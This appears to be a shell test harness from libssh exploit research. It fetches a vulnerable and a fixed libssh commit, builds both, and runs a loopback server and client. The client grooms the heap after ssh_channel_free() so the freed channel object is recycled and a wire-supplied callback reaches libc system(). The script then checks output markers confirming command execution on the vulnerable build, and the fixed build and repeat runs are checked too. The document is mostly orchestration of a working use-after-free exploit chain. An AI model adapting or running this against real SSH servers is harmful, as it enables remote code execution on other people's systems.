#!/bin/sh
# W26 additive lane: the W25 wire-resident callback iterator, wire command
# and direct libc system() call in a plain (non-ASan) build. Instead of a
# cross-run ASan slot probe, the server publishes the live channel object's
# address through MAP_SHARED memory before the authenticated client sends the
# groom packet; the malloc after ssh_channel_free() must recycle that object.
# Both pinned commits, loopback only, no library source change.
set -u
cd "$(dirname "$0")" || exit 1
HERE=$(pwd)

V=a540e27659b08828ef61f2910a790f7cf2af9f8d
F=7dfabb1fd213196c4912c314b418ff36c882ea54
VS=libssh-mirror-$V
FS=libssh-mirror-$F

provision() {
    sha=$1; dir=$2
    if [ ! -d "$dir" ]; then
        curl -fsSL --max-time 60 \
            "https://codeload.github.com/libssh/libssh-mirror/tar.gz/$sha" \
            -o "$dir.tar.gz" || return 1
        tar -xzf "$dir.tar.gz" || return 1
    fi
}

build_plain() {
    dir=$1; out=$2
    cmake -S "$dir" -B "$out" -G Ninja \
        -DCMAKE_BUILD_TYPE=Release -DCMAKE_C_COMPILER=clang \
        -DWITH_SERVER=ON -DUNIT_TESTING=OFF -DBUILD_SHARED_LIBS=OFF \
        -DWITH_GSSAPI=OFF -DWITH_ZLIB=OFF >"$out.configure.log" 2>&1 &&
    ninja -C "$out" ssh >"$out.build.log" 2>&1
}

provision "$V" "$VS" && provision "$F" "$FS" || exit 1
for pair in "$VS build-plain-vuln vuln" "$FS build-plain-fixed fixed"; do
    set -- $pair
    src=$1; b=$2; kind=$3
    build_plain "$src" "$b" || exit 1
    clang -std=gnu99 -O1 -g -fno-omit-frame-pointer -Iasan-shim \
        -DW13_INLINE -DW14_REALSYSTEM -DW16_WIRECMD -DW24_WIRELIST \
        -DW25_SYSWIRE -DW26_PLAINADDR \
        -I "$b/src" -I "$src/src" -I "$src/include" -I "$b/include" -I "$b" \
        real_wire.c "$b/src/libssh.a" -lcrypto -lpthread -ldl \
        -o "real_wire-plain-sw-$kind" || exit 1
    if ldd "real_wire-plain-sw-$kind" 2>/dev/null | grep -qi asan; then
        echo "unexpected sanitizer in plain $kind binary"
        exit 1
    fi
done

if [ ! -f hostkey ]; then
    ssh-keygen -q -t ed25519 -N '' -f hostkey </dev/null >/dev/null 2>&1 || exit 1
fi

PASS=0; FAIL=0
run_lane() {
    n_name=$1; n_kind=$2; n_mode=$3
    mkdir -p "swplain-run/$n_name"
    ln -sf "$HERE/hostkey" "swplain-run/$n_name/hostkey"
    (cd "swplain-run/$n_name" && timeout 25 \
        "$HERE/real_wire-plain-sw-$n_kind" ./hostkey "$n_mode") \
        >"evidence-swplain-$n_name.out" 2>&1
    echo "lane $n_name rc=$?"
}

marker_present() {
    [ -f "swplain-run/$1/evidence-wire-syswire.marker" ] && echo yes || echo no
}

check_vuln() {
    c_out=evidence-swplain-$1.out
    c_file=$(marker_present "$1")
    c_d2=$(grep -c 'SERVER data #2' "$c_out")
    c_t=$(grep -c 'SERVER target_after=0x41414141414141c1' "$c_out")
    c_arm=$(grep -c 'SERVER SYSWIRE armed' "$c_out")
    c_e=$(grep -c 'SERVER EXEC trampoline' "$c_out")
    c_ok=$(grep -c 'CLIENT rc=0 SERVER status=0x0' "$c_out")
    c_cl=$(grep -c 'CLIENT syswire fn=0x' "$c_out")
    c_pub=$(grep -c 'SERVER plainaddr published=0x' "$c_out")
    c_get=$(grep -c 'CLIENT plainaddr slot=0x' "$c_out")
    c_match=$(grep -c 'SERVER plainaddr recycled=.*match=1' "$c_out")
    c_w=$(grep -c 'SERVER wirelist it=' "$c_out")
    if [ "$c_d2" = 1 ] && [ "$c_t" = 1 ] && [ "$c_arm" = 1 ] &&
       [ "$c_e" = 0 ] && [ "$c_ok" = 1 ] && [ "$c_cl" = 1 ] &&
       [ "$c_pub" = 1 ] && [ "$c_get" = 1 ] && [ "$c_match" = 1 ] &&
       [ "$c_w" = 1 ] && [ "$c_file" = yes ]; then
        PASS=$((PASS+1)); echo "PASS-$1 data2=$c_d2 target=$c_t armed=$c_arm trampoline=$c_e published=$c_pub slot=$c_get recycled=$c_match wirelist=$c_w file=$c_file"
    else
        FAIL=$((FAIL+1)); echo "FAIL-$1 got[$c_d2 $c_t $c_arm $c_e $c_ok $c_cl $c_pub $c_get $c_match $c_w $c_file]"
    fi
}

check_fixed() {
    c_out=evidence-swplain-$1.out
    c_file=$(marker_present "$1")
    c_d2=$(grep -c 'SERVER data #2' "$c_out")
    c_arm=$(grep -c 'SERVER SYSWIRE armed' "$c_out")
    c_e=$(grep -c 'SERVER EXEC trampoline' "$c_out")
    c_ok=$(grep -c 'CLIENT rc=0 SERVER status=0x0' "$c_out")
    if [ "$c_d2" = 0 ] && [ "$c_arm" = 0 ] && [ "$c_e" = 0 ] &&
       [ "$c_ok" = 1 ] && [ "$c_file" = no ]; then
        PASS=$((PASS+1)); echo "PASS-$1 data2=0 armed=0 trampoline=0 file=no clean_exit=1"
    else
        FAIL=$((FAIL+1)); echo "FAIL-$1 got[$c_d2 $c_arm $c_e $c_ok $c_file]"
    fi
}

run_lane vuln-syswire-plain vuln groom-syswire-plain
check_vuln vuln-syswire-plain
if [ -f swplain-run/vuln-syswire-plain/evidence-wire-syswire.marker ]; then
    mv swplain-run/vuln-syswire-plain/evidence-wire-syswire.marker \
       evidence-swplain-sideeffect.kept
fi

run_lane fixed-syswire-plain fixed groom-syswire-plain
check_fixed fixed-syswire-plain

# Wire-chosen callee control: an invalid callee must fault at the library call.
run_lane vuln-syswire-plain-bad vuln groom-syswire-plain-bad
b_out=evidence-swplain-vuln-syswire-plain-bad.out
b_status=$(grep -c 'CLIENT rc=0 SERVER status=0x' "$b_out")
b_ok=$(grep -c 'CLIENT rc=0 SERVER status=0x0' "$b_out")
b_arm=$(grep -c 'SERVER SYSWIRE armed' "$b_out")
b_file=$(marker_present vuln-syswire-plain-bad)
b_done=$(grep -c 'SERVER done data_packets=2' "$b_out")
if [ "$b_status" = 1 ] && [ "$b_ok" = 0 ] && [ "$b_arm" = 1 ] &&
   [ "$b_file" = no ] && [ "$b_done" = 0 ]; then
    PASS=$((PASS+1)); echo "PASS-vuln-syswire-plain-bad server_fault=yes armed=$b_arm marker=no server_done=no"
else
    FAIL=$((FAIL+1)); echo "FAIL-vuln-syswire-plain-bad got[status=$b_status clean=$b_ok armed=$b_arm marker=$b_file done=$b_done]"
fi

for i in 1 2 3; do
    run_lane "vuln-repeat$i" vuln groom-syswire-plain
    check_vuln "vuln-repeat$i"
    if [ -f "swplain-run/vuln-repeat$i/evidence-wire-syswire.marker" ]; then
        mv "swplain-run/vuln-repeat$i/evidence-wire-syswire.marker" \
           "evidence-swplain-repeat$i.kept"
    fi
done

echo "syswire-plain: $PASS PASS / $FAIL FAIL"
[ "$FAIL" -eq 0 ]
